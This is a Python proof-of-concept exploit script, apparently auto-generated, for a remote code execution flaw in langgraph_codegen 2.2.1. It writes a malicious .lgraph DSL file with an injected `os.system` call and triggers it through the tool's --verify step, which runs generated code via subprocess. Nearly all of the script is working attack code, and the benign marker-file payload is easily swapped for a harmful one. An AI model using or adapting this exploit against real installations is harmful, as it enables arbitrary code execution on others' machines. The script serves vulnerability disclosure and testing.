#!/usr/bin/env python3
# PoC for langgraph_codegen-2.2.1 (/tmp/langgraph_codegen/langgraph_codegen-2.2.1)
# Path: rce-001
# Sink: verify_generated_files
# Auto-generated — run with: python3 rce_python_subprocess_verify_generated_files.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_codegen-2.2.1 RCE vulnerability.

Vulnerability: The verify_generated_files function executes a Python file via
subprocess.run with a filename derived from the attacker-controlled input file's
basename. Combined with the ability to inject arbitrary Python code through the
DSL content, this allows remote code execution.

Attack vector:
1. Create a malicious .lgraph file containing Python code in node/edge definitions
2. The generated Python files will contain this code
3. When --verify is used, the generated graph file is executed via subprocess.run
4. The basename of the input file is used as the filename, allowing path traversal
"""

import os
import sys
import tempfile
import subprocess
import shutil
from pathlib import Path

# Configuration
TARGET_DIR = "/tmp/langgraph_codegen/langgraph_codegen-2.2.1"
OUTPUT_DIR = "/tmp/poc_exploit"
MALICIOUS_DSL = """
# Malicious DSL file - will generate Python code with RCE payload
state: State(TypedDict):
    message: str

node: execute_payload:
    # This Python code will be injected into the generated file
    import os
    os.system('touch /tmp/poc_success.txt')
    return {"message": "exploited"}

edge: START -> execute_payload
"""

def setup_environment():
    """Ensure the target package is available."""
    sys.path.insert(0, os.path.join(TARGET_DIR, "src"))
    
    # Check if the package can be imported
    try:
        from langgraph_codegen import lgcodegen
        return lgcodegen
    except ImportError:
        print("Error: Could not import langgraph_codegen. Make sure the package is installed.")
        sys.exit(1)

def create_malicious_dsl():
    """Create a malicious .lgraph file with embedded Python code."""
    dsl_path = os.path.join(OUTPUT_DIR, "exploit.lgraph")
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    
    with open(dsl_path, 'w') as f:
        f.write(MALICIOUS_DSL)
    
    print(f"[+] Created malicious DSL file: {dsl_path}")
    return dsl_path

def trigger_exploit(lgcodegen, dsl_path):
    """
    Trigger the vulnerability by running the codegen with --verify flag.
    The malicious DSL content will be parsed and generated into Python files,
    then the verification step will execute the generated graph file.
    """
    # Change to output directory to avoid path issues
    original_cwd = os.getcwd()
    os.chdir(OUTPUT_DIR)
    
    try:
        # Simulate the command: lgcodegen exploit.lgraph --verify
        # We'll call the main function directly with the malicious input
        sys.argv = ['lgcodegen', dsl_path, '--verify', '-o', OUTPUT_DIR]
        
        print("[*] Running codegen with malicious DSL and --verify flag...")
        print("[*] This will generate Python files and execute the graph file")
        
        # The main function will:
        # 1. Read the malicious DSL
        # 2. Parse it and generate Python files with embedded code
        # 3. Execute the generated graph file via subprocess.run
        lgcodegen.main()
        
        print("[+] Exploit triggered successfully!")
        
    except SystemExit as e:
        # The verification step calls sys.exit(2) on failure
        if e.code == 2:
            print("[!] Verification failed (expected - the payload may have executed)")
        else:
            print(f"[!] SystemExit with code {e.code}")
    except Exception as e:
        print(f"[!] Error during exploit: {e}")
    finally:
        os.chdir(original_cwd)

def verify_exploit():
    """Check if the payload was executed successfully."""
    payload_marker = "/tmp/poc_success.txt"
    if os.path.exists(payload_marker):
        print(f"[+] SUCCESS: Payload executed! Found marker file: {payload_marker}")
        with open(payload_marker, 'r') as f:
            print(f"    Content: {f.read()}")
        return True
    else:
        print("[-] Payload may not have executed. Check /tmp/poc_success.txt")
        return False

def cleanup():
    """Remove temporary files."""
    if os.path.exists(OUTPUT_DIR):
        shutil.rmtree(OUTPUT_DIR)
        print(f"[*] Cleaned up {OUTPUT_DIR}")
    
    payload_marker = "/tmp/poc_success.txt"
    if os.path.exists(payload_marker):
        os.remove(payload_marker)
        print(f"[*] Cleaned up {payload_marker}")

def main():
    print("=" * 60)
    print("langgraph_codegen RCE Proof-of-Concept Exploit")
    print("=" * 60)
    print()
    
    # Step 1: Setup
    print("[*] Step 1: Setting up environment...")
    lgcodegen = setup_environment()
    
    # Step 2: Create malicious DSL
    print("[*] Step 2: Creating malicious DSL file...")
    dsl_path = create_malicious_dsl()
    
    # Step 3: Trigger the exploit
    print("[*] Step 3: Triggering exploit...")
    trigger_exploit(lgcodegen, dsl_path)
    
    # Step 4: Verify
    print("[*] Step 4: Verifying exploit...")
    success = verify_exploit()
    
    # Step 5: Cleanup
    print("[*] Step 5: Cleaning up...")
    cleanup()
    
    print()
    if success:
        print("[+] EXPLOIT SUCCESSFUL: RCE achieved via malicious DSL file")
        print("[+] The generated Python file was executed by verify_generated_files")
        print("[+] This demonstrates that an attacker can execute arbitrary code")
        print("[+] by crafting a malicious .lgraph file and using --verify")
    else:
        print("[-] Exploit may have failed. Check the output for errors.")
    
    return 0 if success else 1

if __name__ == "__main__":
    sys.exit(main())
